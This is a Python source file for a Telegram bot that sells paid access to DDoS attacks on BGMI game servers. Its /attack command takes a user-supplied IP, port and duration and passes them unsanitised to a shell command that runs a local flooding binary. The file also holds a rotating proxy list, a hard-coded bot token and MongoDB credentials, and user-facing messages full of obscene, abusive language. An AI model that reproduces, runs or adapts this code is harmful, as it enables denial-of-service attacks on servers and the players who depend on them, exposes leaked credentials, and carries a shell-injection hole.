import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7500957491:AAGUbiI7jgPsHjRqdyPGZnLpY80wOZXnnx0'
MONGO_URI = 'mongodb+srv://Cluster0:Cluster0@cluster0.5mvg9ej.mongodb.net/danger?retryWrites=true&w=majority'
FORWARD_CHANNEL_ID = -1002437393468
CHANNEL_ID = -1002437393468
error_channel_id = -1002437393468

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['danger']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*🚫𝗟𝗢𝗗𝗔 𝗟𝗘𝗟𝗘 𝗠𝗔𝗗𝗛𝗔𝗥𝗖𝗛𝗢𝗗 !*\n"
                                   "*ʏᴇ ᴄᴀᴍᴍᴀɴᴅ sɪʀғ ᴛᴇʀᴇ ᴘᴀᴘᴀ ᴊɪ ᴜsᴇ ᴋᴀʀɴᴇɢᴇ *", parse_mode='NOOB_H4CKER')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*⚠️ Hold on! Invalid command format.*\n"
                                   "*Please use one of the following commands:*\n"
                                   "*1. /approve <user_id> <plan> <days>*\n"
                                   "*2. /disapprove <user_id>*", parse_mode='NOOB_H4CKER')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*🚫 Approval Failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='NOOB_H4CKER')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*🚫 Approval Failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='NOOB_H4CKER')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*💫OP BHAI ✨!*\n"
                    f"*User {target_user_id} has been approved!*\n"
                    f"*Plan: {plan} for {days} days!*\n"
                    f"*AB TUM BHI BGMI KI RANDI MAA KO CHODO 🥵✨*")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"⏳TIME": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*❌ Disapproval Notice!*\n"
                    f"*User {target_user_id} has been disapproved.*\n"
                    f"*They have been reverted to free access.*\n"
                    f"*Encourage them to try again soon! 🍀*")

    bot.send_message(chat_id, msg_text, parse_mode='NOOB_H4CKER')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='NOOB_H4CKER')



# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🔮LODA LELE MADHARCHOD 🥵!*\n"  # Access Denied message
                                       "*🔮PHLE RAAJ PAPA SE JAKAR PERMISSION LE TAB KAAM KAREGE HAM 🎭*\n"  # Need approval message
                                       "*Contact the owner for assistance: @NOOB_H4CKER.*", parse_mode='NOOB_H4CKER')  # Contact owner message
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"  # Instant Plan full message
                                       "*Please consider upgrading for priority access.*", parse_mode='NOOB_H4CKER')  # Upgrade message
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"  # Instant++ Plan full message
                                       "*Consider upgrading or try again later.*", parse_mode='NOOB_H4CKER')  # Upgrade message
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"  # Busy message
                                       "*RUK JA BETICHOD KAHI OR ATTACK LAG RHA HAI *\n"  # Current attack message
                                       "*CHECK KARLE KITNA TIME PHLE ATTACK MARA HAI /when CAMMAAND🎭.*", parse_mode='NOOB_H4CKER')  # Check remaining time
            return

        bot.send_message(chat_id, "*🔮 MAI READY HU SIR ✨*\n"  # Ready to launch message

"*🔮ESE DALO SIR: 167.67.25 6296 60* 🔥\n"  # Example message
                                   "*🔮CHALO GAND MARTE HAI BGMI KI! 🎉*", parse_mode='NOOB_H4CKER')  # Start chaos message
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ ERROR!*\n"  # Error message
                                               "*🔮GALTI KAHE DALI RHA HAI RANDI SHI SE DALO NA *\n"  # Correct format message
                                               "*🔮IP,PORT,TIME, SHI SE DALO BETICHOD 🎭! 🔄*", parse_mode='NOOB_H4CKER')  # Three inputs message
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 PORT {target_port} BLOCK HAI BETA ✨*\n"  # Blocked port message
                                     
"*🔮DURSA PORT USE MARO BSDK 💫*", parse_mode='NOOB_H4CKER')  # Different port message
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"  # Duration limit message
                                               "*Please shorten the duration and try again!*", parse_mode='NOOB_H4CKER')  # Shorten duration message
            return  

        bot.attack_in_progress = True  # Mark that an attack is in progress
        bot.attack_duration = duration  # Store the duration of the ongoing attack
        bot.attack_start_time = time.time()  # Record the start time

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 BGMI KI GAND MARLI ! 🚀*\n\n"  # Attack launched message
                                           f"*🔮 IP ADRESS: {target_ip}*\n"  # Target host message
                                           f"*🔮IP PORT: {target_port}*\n"  # Target port message
                                           f"*🔮TIME: {duration} seconds!🔥*", parse_mode='NOOB_H4CKER')  # Duration message

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")





def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ITNA TIME RUKJA BETICHOD: {int(remaining_time)} seconds...*\n"
                                       "*🔮BEECH ME KUCH BACKCHODI KIYA TO GANE CRUSHED KAR DUNGA !*\n"
                                       "*💪 Stay tuned for updates!*", parse_mode='NOOB_H4CKER')
        else:
            bot.send_message(chat_id, "*🎉 AB JYDA NHI PELUNGA BHAI THAK GYA AB !*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='NOOB_H4CKER')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='NOOB_H4CKER')


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if not user_data:
        # User not found in the database
        response = "*❌ Oops! No account information found!* \n"  # Account not found message
        response += "*For assistance, please contact the owner: @NOOB_H4CKER* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @NOOB_H4CKER* 🙏"  # Contact owner message
    else:
        # User found and approved
        username = message.from_user.username or "Unknown User"  # Default username if none provided
        plan = user_data.get('plan', 'N/A')  # Get user plan
        valid_until = user_data.get('valid_until', 'N/A')  # Get validity date
        current_time = datetime.now().isoformat()  # Get current time
        response = (f"*🔮 USERNAME: @{username}* \n"  # Username
                    f"*🔮 PLAN: {plan}* \n"  # User plan
                    f"*🔮 VALID UNTIL: {valid_until}* \n"  # Validity date
                    f"*🔮 CURRENT TIME: {current_time}* \n"  # Current time
                    f"*🔮 APNE BARE ME PATA KARNE AYA HAI BSDK . CHAL AB NIKAL LAUDE 🥵")  # Community message

    bot.send_message(message.chat.id, response, parse_mode='NOOB_H4CKER')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "🔮 RAAJ KO JAKAR PAPA BOLO Z.\n\n"
        "🔮 OR KOI RUKE NHI HAI BHAI \nDAWA KA BANDE PELO🥵 .\n\n"
        "🔮 PROOF ! 🛡️ \nHIGEST KILL KA SS BHEJ DENA BOT ME.\n\n"
        "🔮 LET'S ENJOY BABYGIRL 💫!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='NOOB_H4CKER')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")

    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*WELCOME TO CAMMAND WORLD !*\n\n"
                 "*🔮VERIFIED CAMMAND:🔮* \n"
                 "🔮 *`/attack` - 💫LAUCH KARO BETICHOD !*\n"
                 "🔮 *`/myinfo` - 💫A0NE BARE ME JANO !*\n"
                 "🔮 *`/owner` - 💫HAMARE OWNER *\n"
                 "🔮 *`/when` - 💫 D-DOS TIMER *\n"
                 "🔮 *`/rules` - RULE DEKH LO FIR BAN HO JAYAGA *\n\n"
                 "*🥍 ENJOY KARO BHAI BGMI KE MOM KE SATH ✨!*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='NOOB_H4CKER')
    except Exception as e:
        print(f"Error while processing /help command: {e}")



@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "🪩𝗕𝗔𝗔𝗣 𝗞𝗜 𝗬𝗔𝗔𝗗 𝗔𝗔𝗚𝗬𝗜 𝗕𝗘𝗧𝗔✨:\n\n"
        "📩 𝗢𝗪𝗡𝗘𝗥 :** @NOOB_H4CKER\n\n"

        "🌟 **THANKS TO USE SERVER BOT NAD FUCK BGMI MOM!*\n"
    )
    bot.send_message(message.chat.id, response, parse_mode='NOOB_H4CKER')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO MY DDOS WORLD!* 🎉\n\n"
                                           "*🚀 AJAO YAAR BGMI KI MAA CHODTE HAI WITHOUT CONDAM 🥵!*\n\n"
                                           "*💣 Example:- Try /help to more cammands * ⚔️\n\n"

  "*📚JISKO BGMI KI GAND MARNI HAI WO MASSAGE KARO *📜\n\n"


"*🔥 Approval BUY :- @NOOB_H4CKER !*\n\n"
             
"*⚠️MOST POWERFUL BOT !* 😈💥", 
                                           parse_mode='NOOB_H4CKER')
    except Exception as e:
        print(f"Error while processing /start command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
